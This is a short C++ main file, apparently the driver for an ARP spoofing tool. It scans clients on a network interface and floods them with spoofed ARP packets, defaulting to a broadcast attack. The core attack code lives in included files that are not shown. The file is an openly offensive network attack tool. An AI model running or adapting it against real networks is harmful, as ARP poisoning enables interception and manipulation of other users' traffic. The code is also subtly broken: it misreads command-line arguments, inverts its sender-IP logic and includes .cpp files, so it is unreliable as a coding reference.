#include <iostream>
#include <optional>
#include "network/NetworkHeader.h"
#include "network/NetTools.cpp"
#include "network/ARPAttackAgent.cpp"


int main(int argc, char* argv[]) {
    if (argc < 1) {
        std::cout << "Failed load network protocol..." << std::endl;
        return 1;
    }

    char* netInterface = argv[0];
    std::optional<uint8_t*> tempSenderIp = NetTools::strToIP(argv[1]);
    uint8_t* senderIP;
    auto targetIp = NetTools::strToIP(argv[2]);
    if (!tempSenderIp) {
        std::cout << "INFO: Target-ip setting-up as my-ip" << std::endl;
        senderIP = NetTools::findMyIP();
    } else senderIP = nullptr;
    if (!targetIp) std::cout << "WARNING: Broadcast ARP spoofing attack...." << std::endl;

    auto arpAttackAgent = ARPAttackAgent(netInterface, senderIP, targetIp);
    arpAttackAgent.scanClients();

    arpAttackAgent.sendARPAttack(ARPAttackAgent::UNLIMITED);
}
